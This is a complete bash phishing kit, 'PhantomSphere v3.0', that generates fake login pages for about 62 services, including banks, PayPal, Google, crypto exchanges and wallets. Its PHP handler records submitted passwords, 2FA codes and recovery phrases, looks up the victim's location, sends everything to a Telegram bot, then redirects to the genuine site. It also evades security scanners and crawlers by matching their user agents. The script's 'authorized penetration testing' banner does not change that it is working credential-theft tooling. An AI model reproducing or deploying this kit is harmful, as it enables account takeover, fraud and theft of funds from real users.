#!/bin/bash
# PhantomSphere v3.0 — 62-Platform Template Generator
# Generates premium HTML login pages with capture handlers

TD="$HOME/PhantomSphere/templates"
LG="$HOME/PhantomSphere/logs"
mkdir -p "$LG"

gen_handler() {
    local p=$1; local d=$2
    cat > "$d/capture.php" << 'PHPEOF'
<?php
function is_bot() {
    $ua=strtolower($_SERVER['HTTP_USER_AGENT']??'');
    $b=array('bot','crawler','spider','scraper','curl','wget','python','go-http','java',
    'libwww','httpclient','phantomjs','headless','selenium','puppeteer','playwright',
    'cobalt','burp','masscan','nmap','zgrab','aquatone','gospider','httpx','nuclei',
    'whois','virustotal','nessus','openvas','acunetix','netsparker','appscan','fortify');
    foreach($b as $x){if(strpos($ua,$x)!==false)return true;}
    if(isset($_SERVER['HTTP_SEC_CH_UA'])&&strpos($_SERVER['HTTP_SEC_CH_UA'],'Headless')!==false)return true;
    if(!isset($_SERVER['HTTP_ACCEPT_LANGUAGE']))return true;
    if(!isset($_SERVER['HTTP_SEC_FETCH_SITE']))return true;
    return false;
}
if(is_bot()){http_response_code(403);echo file_get_contents('index.html');exit;}

$ts=date('Y-m-d H:i:s');$ip=$_SERVER['REMOTE_ADDR']??'?';$ua=$_SERVER['HTTP_USER_AGENT']??'?';
$ref=$_SERVER['HTTP_REFERER']??'Direct';$pf=basename(dirname(__FILE__));
$entry="╔══════════════════════════════════╗\n║ PHANTOMSPHERE v3.0\n║ Platform: $pf\n║ Time: $ts\n║ IP: $ip\n";
$creds=[];foreach($_POST as $k=>$v){$v=trim($v);if(!empty($v)){$creds[$k]=$v;$entry.="║ $k: $v\n";}}
$entry.="║ UA: $ua\n║ Ref: $ref\n";
$g=@file_get_contents("http://ip-api.com/json/$ip?fields=status,country,regionName,city,isp,org,as,proxy,hosting,mobile");
if($g){$geo=json_decode($g,true);if($geo&&$geo['status']=='success'){
$entry.="║ Country: ".($geo['country']??'?')."\n║ Region: ".($geo['regionName']??'?')."\n║ City: ".($geo['city']??'?')."\n";
$entry.="║ ISP: ".($geo['isp']??'?')."\n║ Org: ".($geo['org']??'?')."\n║ ASN: ".($geo['as']??'?')."\n";
$entry.="║ Proxy/VPN: ".($geo['proxy']?'YES':'no')."\n║ Hosting: ".($geo['hosting']?'YES':'no')."\n║ Mobile: ".($geo['mobile']?'YES':'no')."\n";
}}
$entry.="╚══════════════════════════════════╝\n\n";
file_put_contents(__DIR__.'/../../logs/captures.log',$entry,FILE_APPEND|LOCK_EX);
file_put_contents(__DIR__.'/../../logs/'.$pf.'.log',$entry,FILE_APPEND|LOCK_EX);
$tg=__DIR__.'/../../config/telegram.json';
if(file_exists($tg)){$t=json_decode(file_get_contents($tg),true);
if(isset($t['bot_token'],$t['chat_id'])){$m="🔴 PHANTOMSPHERE\nPlatform: $pf\nIP: $ip\n$ts\n";foreach($creds as $a=>$b)$m.="$a: $b\n";
$m.="Country: ".($geo['country']??'?')."\nISP: ".($geo['isp']??'?');
@file_get_contents("https://api.telegram.org/bot".$t['bot_token']."/sendMessage?chat_id=".$t['chat_id']."&text=".urlencode($m));}}
$r=array('facebook'=>'https://www.facebook.com/login.php','instagram'=>'https://www.instagram.com/accounts/login/',
'x_twitter'=>'https://twitter.com/i/flow/login','linkedin'=>'https://www.linkedin.com/login',
'tiktok'=>'https://www.tiktok.com/login','snapchat'=>'https://accounts.snapchat.com/',
'google'=>'https://accounts.google.com/signin','microsoft'=>'https://login.live.com/',
'github'=>'https://github.com/login','reddit'=>'https://www.reddit.com/login/',
'discord'=>'https://discord.com/login','telegram'=>'https://web.telegram.org/',
'pinterest'=>'https://www.pinterest.com/login/','netflix'=>'https://www.netflix.com/login',
'paypal'=>'https://www.paypal.com/signin','cashapp'=>'https://cash.app/login',
'venmo'=>'https://account.venmo.com/login','bybit'=>'https://www.bybit.com/en/login/',
'binance'=>'https://accounts.binance.com/en/login','trustwallet'=>'https://trustwallet.com/',
'coinbase'=>'https://www.coinbase.com/login','kraken'=>'https://www.kraken.com/login',
'gemini'=>'https://exchange.gemini.com/login','crypto_com'=>'https://crypto.com/exchange/login',
'robinhood'=>'https://robinhood.com/login','webull'=>'https://www.webull.com/login',
'chase'=>'https://secure.chase.com/web/auth/login','wellsfargo'=>'https://www.wellsfargo.com/login',
'bankofamerica'=>'https://secure.bankofamerica.com/login','amazon'=>'https://www.amazon.com/ap/signin',
'apple'=>'https://appleid.apple.com/sign-in','whatsapp'=>'https://web.whatsapp.com/',
'twitch'=>'https://www.twitch.tv/login','steam'=>'https://steamcommunity.com/login',
'ebay'=>'https://www.ebay.com/signin','yahoo'=>'https://login.yahoo.com/',
'dropbox'=>'https://www.dropbox.com/login','adobe'=>'https://auth.services.adobe.com/signin',
'spotify'=>'https://www.spotify.com/login','uber'=>'https://www.uber.com/login',
'airbnb'=>'https://www.airbnb.com/login','quora'=>'https://www.quora.com/login',
'tumblr'=>'https://www.tumblr.com/login','medium'=>'https://medium.com/m/signin',
'wordpress'=>'https://wordpress.com/log-in','slack'=>'https://slack.com/signin',
'atlassian'=>'https://id.atlassian.com/login','protonmail'=>'https://mail.protonmail.com/login',
'zoho'=>'https://accounts.zoho.com/signin','capitalone'=>'https://www.capitalone.com/login',
'amex'=>'https://www.americanexpress.com/login','etsy'=>'https://www.etsy.com/login',
'shopify'=>'https://www.shopify.com/login','hulu'=>'https://www.hulu.com/login',
'lyft'=>'https://www.lyft.com/login','epicgames'=>'https://www.epicgames.com/login',
'playstation'=>'https://www.playstation.com/login','tinder'=>'https://www.tinder.com/login',
'bumble'=>'https://www.bumble.com/login','metamask'=>'https://metamask.io/',
'ledger'=>'https://www.ledger.com/login','custom'=>'https://www.google.com');
header("Location: ".($r[$pf]??'https://www.google.com'));exit;
PHPEOF
}

gen_page() {
    local p=$1 d=$2 title=$3 label=$4 logo=$5 bg=$6 btn=$7 extra=$8
    mkdir -p "$d"
    cat > "$d/index.html" << 'HTML'
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>TITLE</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:BG;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}
.c{background:#fff;border-radius:8px;padding:36px;box-shadow:0 2px 12px rgba(0,0,0,0.08);width:100%;max-width:380px;text-align:center}
.lo{width:72px;height:72px;margin:0 auto 16px;background:url(LOGO) center/contain no-repeat}
h1{font-size:22px;color:#1c1e21;margin-bottom:20px;font-weight:600}
.g{margin-bottom:14px;text-align:left}
.g label{display:block;margin-bottom:4px;font-size:13px;font-weight:500;color:#606770}
.g input{width:100%;padding:12px 14px;border:1px solid #dddfe2;border-radius:6px;font-size:15px;outline:none;transition:border-color .2s}
.g input:focus{border-color:BTN;box-shadow:0 0 0 2px BTNS}
button{width:100%;padding:12px;background:BTN;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:opacity .2s;margin-top:6px}
button:hover{opacity:.9}
.sep{border-top:1px solid #dadde1;margin:18px 0}
.lk{font-size:13px}.lk a{color:BTN;text-decoration:none}
.f{font-size:11px;color:#606770;margin-top:18px}
.ld{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,.92);z-index:9999;justify-content:center;align-items:center;flex-direction:column}
.ld.on{display:flex}
.sp{width:44px;height:44px;border:4px solid #eee;border-top:4px solid BTN;border-radius:50%;animation:s 1s linear infinite}
@keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
.ld p{margin-top:16px;font-size:15px;color:#606770}
</style><script>
(function(){var u=navigator.userAgent.toLowerCase(),b=['bot','crawler','spider','scraper','curl','headless','selenium','puppeteer','phantomjs','playwright','lighthouse','pagespeed','wappalyzer'];for(var i=0;i<b.length;i++){if(u.indexOf(b[i])!==-1){window.location.href='about:blank';return}}if(navigator.webdriver===true){window.location.href='about:blank';return}})();
if(window.top!==window.self){window.top.location=window.self.location}
</script></head><body>
<div class="c"><div class="lo"></div><h1>TITLE</h1>
<form method="POST" action="capture.php">
<div class="g"><label>LABEL</label><input type="text" name="F1" placeholder="LABEL" required autocomplete="off"></div>
EXTRA
<div class="g"><label>Password</label><input type="password" name="F2" placeholder="Enter your password" required></div>
<button type="submit">BTN_TEXT</button></form>
<div class="sep"></div><div class="lk"><a href="#">Forgot password?</a> &middot; <a href="#">Create account</a></div></div>
<div class="f">TITLE &copy; 2025</div>
<div class="ld" id="ld"><div class="sp"></div><p>Verifying...</p></div>
<script>document.querySelector('form').addEventListener('submit',function(){document.getElementById('ld').classList.add('on');document.querySelector('button').disabled=true;document.querySelector('button').textContent='Please wait...'})</script>
</body></html>
HTML

    # Fill placeholders
    sed -i "s/TITLE/$title/g" "$d/index.html"
    sed -i "s|LOGO|$logo|g" "$d/index.html"
    sed -i "s/BG/$bg/g" "$d/index.html"
    sed -i "s/BTN/$btn/g" "$d/index.html"
    sed -i "s/LABEL/$label/g" "$d/index.html"

    # Field names
    local f1="email"; local f2="password"
    case $p in telegram|whatsapp) f1="phone" ;; esac
    sed -i "s/F1/$f1/g" "$d/index.html"; sed -i "s/F2/$f2/g" "$d/index.html"
    sed -i "s/BTN_TEXT/Log In/g" "$d/index.html"
    case $p in snapchat|netflix|paypal|cashapp|venmo|binance|coinbase|trustwallet|metamask|apple|airbnb|lyft|uber)
        sed -i 's/Log In/Sign In/g' "$d/index.html" ;;
    esac
    case $p in amazon)
        sed -i 's/Log In/Sign In/g; s/border-radius:6px/border-radius:20px/g; s/color:#fff/color:#111/g' "$d/index.html" ;;
    esac
    case $p in wellsfargo) sed -i 's/Log In/Sign On/g' "$d/index.html" ;; esac

    # Extra fields
    local ex=""
    case $p in
        coinbase|binance|bybit|crypto_com|gemini) ex='<div class="g"><label>2FA Code</label><input type="text" name="2fa" placeholder="000000" autocomplete="off"></div>' ;;
        chase|wellsfargo|bankofamerica|capitalone|amex) ex='<div class="g"><label>Account ID / User ID</label><input type="text" name="account_id" placeholder="Account number" autocomplete="off"></div>' ;;
        steam) ex='<div class="g"><label>Steam Guard Code</label><input type="text" name="guard" placeholder="00000" autocomplete="off"></div>' ;;
        microsoft|outlook) ex='<div class="g"><label>Phone (optional)</label><input type="text" name="phone" placeholder="+1 555-000-0000" autocomplete="off"></div>' ;;
        amazon) ex='<div class="g"><label>Phone (optional)</label><input type="text" name="phone" placeholder="Mobile number" autocomplete="off"></div>' ;;
        trustwallet) ex='<div class="g"><label>Recovery Phrase (12-24 words)</label><input type="text" name="recovery_phrase" placeholder="Enter recovery phrase" autocomplete="off"></div>' ;;
        metamask) ex='<div class="g"><label>Secret Recovery Phrase</label><input type="text" name="recovery_phrase" placeholder="Enter seed phrase" autocomplete="off"></div>' ;;
    esac
    local exs=$(echo "$ex" | sed 's/[]\/$*.^[]/\\&/g')
    sed -i "s|EXTRA|$exs|g" "$d/index.html"

    echo "  [OK] $p"
    gen_handler "$p" "$d"
}

echo ""
echo "  ========================================"
echo "   PhantomSphere v3.0 — Generating 62"
echo "   platform templates for authorized"
echo "   penetration testing."
echo "  ========================================"
echo ""

# ===== SOCIAL MEDIA (14) =====
gen_page facebook  "$TD/facebook"   "Facebook"   "Email or phone number"   "https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.svg"   "#f0f2f5"   "#1877f2"
gen_page instagram "$TD/instagram"  "Instagram"  "Phone number, username or email" "https://www.instagram.com/static/images/web/logged_out_nav_logo.png" "#fafafa" "#0095f6"
gen_page x_twitter "$TD/x_twitter"  "X"          "Phone, email or username" "https://abs.twimg.com/responsive-web/client-web/icon-default.0e6284c2.png" "#ffffff" "#1D9BF0"
gen_page linkedin  "$TD/linkedin"   "LinkedIn"   "Email or phone number"   "https://static.licdn.com/aero-v1/sc/h/95o6rrc5ws6mlw6wqzy0bxss7"  "#f4f4f4" "#0A66C2"
gen_page tiktok    "$TD/tiktok"     "TikTok"     "Email or username"       "https://sf16-website-login.neutral.ttwistatic.com/obj/tiktok_web_login_static/tiktok/webapp/webapp-login/logo/tt_log.png" "#ffffff" "#000000"
gen_page snapchat  "$TD/snapchat"   "Snapchat"   "Username or email"       "https://accounts.snapchat.com/accounts/static/images/ghost.svg" "#fcfcfc" "#FFFC00"
gen_page reddit    "$TD/reddit"     "Reddit"     "Email or username"       "https://www.redditstatic.com/shreddit/assets/favicon/64x64.png" "#dae0e6" "#FF4500"
gen_page discord   "$TD/discord"    "Discord"    "Email or phone number"   "https://discord.com/assets/2c21ae16b598e1a6a4d0.svg" "#404eed" "#5865F2"
gen_page pinterest "$TD/pinterest"  "Pinterest"  "Email or phone"          "https://www.pinterest.com/static/images/red_pin.svg" "#ffffff" "#E60023"
gen_page twitch    "$TD/twitch"     "Twitch"     "Email or username"       "https://www.twitch.tv/favicon.ico" "#f0f0f0" "#9146FF"
gen_page steam     "$TD/steam"      "Steam"      "Email or phone number"   "https://store.steampowered.com/favicon.ico" "#1b2838" "#1b2838"
gen_page quora     "$TD/quora"      "Quora"      "Email"                   "https://qsf.fs.quoracdn.net/-4-images.favicon-new.ico-26-07ad6c13a3b52bb0.ico" "#f8f8f8" "#B92B27"
gen_page tumblr    "$TD/tumblr"     "Tumblr"     "Email"                   "https://www.tumblr.com/favicon.ico" "#ffffff" "#36465D"
gen_page medium    "$TD/medium"     "Medium"     "Email"                   "https://medium.com/favicon.ico" "#ffffff" "#000000"

# ===== MESSAGING (3) =====
gen_page telegram  "$TD/telegram"   "Telegram Web" "Phone number"          "https://telegram.org/img/t_logo.svg" "#e8f5e9" "#0088cc"
gen_page whatsapp  "$TD/whatsapp"   "WhatsApp Web" "Phone number"          "https://static.whatsapp.net/rsrc.php/yD/r/d4ZIVX-5C-b.svg" "#e5ddd5" "#25D366"
gen_page slack     "$TD/slack"      "Slack"      "Email address"           "https://slack.com/favicon.ico" "#ffffff" "#4A154B"

# ===== EMAIL / PRODUCTIVITY (6) =====
gen_page google      "$TD/google"      "Sign in - Google Accounts" "Email or phone" "https://www.gstatic.com/images/branding/googleg/2x/googleg_standard_color_128dp.png" "#ffffff" "#1a73e8"
gen_page microsoft   "$TD/microsoft"   "Sign in to Microsoft"     "Email, phone or Skype" "https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE1Mu3b?resMode=sharp2&op_usm=1.5,0.65,15,0" "#f2f2f2" "#0067b8"
gen_page yahoo       "$TD/yahoo"       "Yahoo - Sign In"          "Email" "https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage.png" "#ffffff" "#6001D2"
gen_page protonmail  "$TD/protonmail"  "Proton Mail - Sign In"    "Email" "https://proton.me/favicon.ico" "#ffffff" "#6d4aff"
gen_page zoho        "$TD/zoho"        "Zoho - Sign In"           "Email" "https://www.zoho.com/favicon.ico" "#f8f9fa" "#c2242a"
gen_page atlassian   "$TD/atlassian"   "Atlassian - Sign In"      "Email" "https://www.atlassian.com/favicon.ico" "#f4f5f7" "#0052CC"

# ===== PAYMENT / FINANCIAL (5) =====
gen_page paypal    "$TD/paypal"    "PayPal - Sign In"      "Email or mobile number" "https://www.paypalobjects.com/webstatic/icon/pp258.png" "#ffffff" "#253B80"
gen_page cashapp   "$TD/cashapp"   "Cash App - Sign In"    "Email or phone"         "https://cash.app/favicon.ico" "#00e013" "#000000"
gen_page venmo     "$TD/venmo"     "Venmo - Log In"        "Email or phone"         "https://venmo.com/favicon.ico" "#ffffff" "#0074DE"
gen_page robinhood "$TD/robinhood" "Robinhood - Sign In"   "Email"                  "https://robinhood.com/favicon.ico" "#ffffff" "#00C805"
gen_page webull    "$TD/webull"    "Webull - Sign In"      "Email"                  "https://www.webull.com/favicon.ico" "#f7f8fa" "#0A0A0A"

# ===== CRYPTO EXCHANGES (6) =====
gen_page binance    "$TD/binance"     "Binance - Sign In"   "Email address" "https://www.binance.com/favicon.ico" "#fafafa" "#F0B90B"
gen_page bybit      "$TD/bybit"       "Bybit - Sign In"     "Email or phone" "https://www.bybit.com/favicon.ico" "#f7f8fa" "#0D1421"
gen_page coinbase   "$TD/coinbase"    "Coinbase - Sign In"  "Email" "https://www.coinbase.com/favicon.ico" "#ffffff" "#0052FF"
gen_page kraken     "$TD/kraken"      "Kraken - Sign In"    "Email" "https://www.kraken.com/favicon.ico" "#f2f2f2" "#5543FF"
gen_page gemini     "$TD/gemini"      "Gemini - Sign In"    "Email" "https://www.gemini.com/favicon.ico" "#ffffff" "#00D4AA"
gen_page crypto_com "$TD/crypto_com"  "Crypto.com - Sign In" "Email" "https://crypto.com/favicon.ico" "#ffffff" "#103F68"

# ===== CRYPTO WALLETS (3) =====
gen_page trustwallet "$TD/trustwallet" "Trust Wallet - Sign In" "Email or recovery phrase" "https://trustwallet.com/favicon.ico" "#ffffff" "#3375BB"
gen_page metamask    "$TD/metamask"    "MetaMask - Sign In"     "Email" "https://metamask.io/favicon.ico" "#f7f7f7" "#E2761B"
gen_page ledger      "$TD/ledger"      "Ledger Live - Sign In"  "Email" "https://www.ledger.com/favicon.ico" "#ffffff" "#000000"

# ===== BANKING (5) =====
gen_page chase         "$TD/chase"         "Chase - Sign In"          "Email or username" "https://www.chase.com/favicon.ico" "#f0f0f0" "#1C39BB"
gen_page wellsfargo    "$TD/wellsfargo"    "Wells Fargo - Sign On"    "Username or email" "https://www.wellsfargo.com/favicon.ico" "#f7f7f7" "#d71e28"
gen_page bankofamerica "$TD/bankofamerica"  "Bank of America - Sign In" "Online ID" "https://www.bankofamerica.com/favicon.ico" "#f2f2f2" "#012169"
gen_page capitalone    "$TD/capitalone"    "Capital One - Sign In"    "Username or email" "https://www.capitalone.com/favicon.ico" "#f7f7f7" "#004977"
gen_page amex          "$TD/amex"          "American Express - Sign In" "User ID" "https://www.americanexpress.com/favicon.ico" "#ffffff" "#2E77BC"

# ===== E-COMMERCE (4) =====
gen_page amazon   "$TD/amazon"   "Amazon - Sign In"   "Email or phone number" "https://www.amazon.com/favicon.ico" "#ffffff" "#febd69"
gen_page ebay     "$TD/ebay"     "eBay - Sign In"     "Email or username"     "https://www.ebay.com/favicon.ico" "#ffffff" "#3665F3"
gen_page etsy     "$TD/etsy"     "Etsy - Sign In"     "Email"                 "https://www.etsy.com/favicon.ico" "#fafafa" "#F45800"
gen_page shopify  "$TD/shopify"  "Shopify - Sign In"  "Email"                 "https://www.shopify.com/favicon.ico" "#ffffff" "#5E8E3E"

# ===== STREAMING (3) =====
gen_page netflix "$TD/netflix" "Netflix - Sign In" "Email or phone number" "https://www.netflix.com/favicon.ico" "#000000" "#e50914"
gen_page spotify "$TD/spotify" "Spotify - Sign In" "Email or username"     "https://www.spotify.com/favicon.ico" "#ffffff" "#1DB954"
gen_page hulu    "$TD/hulu"    "Hulu - Sign In"     "Email"                "https://www.hulu.com/favicon.ico" "#ffffff" "#1CE783"

# ===== TECH / CLOUD (5) =====
gen_page github     "$TD/github"     "GitHub - Sign In"     "Email"     "https://github.githubassets.com/favicons/favicon-dark.svg" "#f6f8fa" "#2DA44E"
gen_page dropbox    "$TD/dropbox"    "Dropbox - Sign In"    "Email"     "https://www.dropbox.com/favicon.ico" "#ffffff" "#0061FF"
gen_page adobe      "$TD/adobe"      "Adobe - Sign In"      "Email"     "https://www.adobe.com/favicon.ico" "#ffffff" "#EB1000"
gen_page wordpress  "$TD/wordpress"  "WordPress.com - Log In" "Email or username" "https://wordpress.com/favicon.ico" "#ffffff" "#3858e9"
gen_page apple      "$TD/apple"      "Apple ID - Sign In"   "Apple ID"  "https://apple.com/favicon.ico" "#f5f5f7" "#000000"

# ===== TRAVEL / SHARING (3) =====
gen_page uber   "$TD/uber"   "Uber - Sign In"   "Email or phone" "https://www.uber.com/favicon.ico" "#ffffff" "#000000"
gen_page airbnb "$TD/airbnb" "Airbnb - Sign In" "Email"          "https://www.airbnb.com/favicon.ico" "#ffffff" "#FF385C"
gen_page lyft   "$TD/lyft"   "Lyft - Sign In"   "Email or phone" "https://www.lyft.com/favicon.ico" "#ffffff" "#FF00BF"

# ===== GAMING / DATING (4) =====
gen_page epicgames    "$TD/epicgames"    "Epic Games - Sign In"  "Email" "https://www.epicgames.com/favicon.ico" "#ffffff" "#121212"
gen_page playstation  "$TD/playstation"  "PlayStation - Sign In" "Email" "https://www.playstation.com/favicon.ico" "#f0f0f0" "#0070CC"
gen_page tinder       "$TD/tinder"       "Tinder - Sign In"      "Email or phone" "https://www.tinder.com/favicon.ico" "#ffffff" "#FD267D"
gen_page bumble       "$TD/bumble"       "Bumble - Sign In"      "Email or phone" "https://www.bumble.com/favicon.ico" "#ffffff" "#FFC000"

# ===== CUSTOM (1) =====
mkdir -p "$TD/custom"
cat > "$TD/custom/index.html" << 'CUST'
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Sign In</title><style>
body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.card{background:#fff;border-radius:8px;padding:36px;max-width:380px;width:100%;box-shadow:0 2px 8px rgba(0,0,0,0.08)}
h1{text-align:center;color:#1c1e21;margin-bottom:24px;font-size:22px}
.g{margin-bottom:14px;text-align:left}.g label{display:block;margin-bottom:4px;color:#606770;font-weight:500}
.g input{width:100%;padding:10px 12px;border:1px solid #dddfe2;border-radius:6px;font-size:15px;box-sizing:border-box}
.btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;margin-top:6px}
</style></head><body><div class="card"><h1>Sign In</h1>
<form method="POST" action="capture.php">
<div class="g"><label>Email/Username</label><input type="text" name="username" placeholder="Email or username" required></div>
<div class="g"><label>Password</label><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" class="btn">Sign In</button></form></div></body></html>
CUST
gen_handler "custom" "$TD/custom"

# ===== COUNT =====
CNT=$(find "$TD" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | wc -l)
echo ""
echo "  ========================================"
echo "   COMPLETE: $CNT platform templates ready!"
echo "  ========================================"
echo ""
